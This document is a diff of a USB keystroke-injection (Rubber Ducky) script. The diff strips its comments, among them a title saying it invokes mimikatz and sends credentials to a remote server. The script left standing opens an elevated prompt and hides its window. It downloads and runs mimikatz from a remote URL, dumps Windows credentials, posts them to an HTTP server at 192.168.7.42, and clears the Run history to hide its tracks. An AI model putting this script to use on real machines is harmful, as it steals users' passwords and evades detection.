@@ -1,15 +1,5 @@
-REM Title: Invoke mimikatz and send creds to remote Server
-REM Author: Brian Kitkat
-REM
-REM
-REM
-REM
-REM
-REM
-REM
 DELAY 3000
-REM Open an admin prompt
-Delay 200
+DELAY 200
 GUI r
 DELAY 500
 STRING powershell Start-Process cmd -Verb runAs
@@ -19,30 +9,15 @@ LEFT
 DELAY 300
 ENTER
 DELAY 500
-REM
-REM
-REM
-REM
-REM Obfuscate the command prompt
 STRING mode con:cols=18 lines=1
 ENTER
+DELAY 200
 STRING color FE
 ENTER
-REM
-REM
-REM
-REM
-REM
+DELAY 200
 STRING powershell "IEX (New-Object Net.WebClient).DownloadString('https://github.com/brian-kitakt/RubberDuckPWD/tree/master/mk.ps1'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('http://192.168.7.42/creds/rx.php', $output)"
 ENTER
 DELAY 12000
-REM
-REM
-REM
-REM
-REM
-REM
-REM Clear the Run histroy and exit
 STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRV' -Name '*' -ErrorAction SilentlyContinue"
 ENTER
 STRING exit
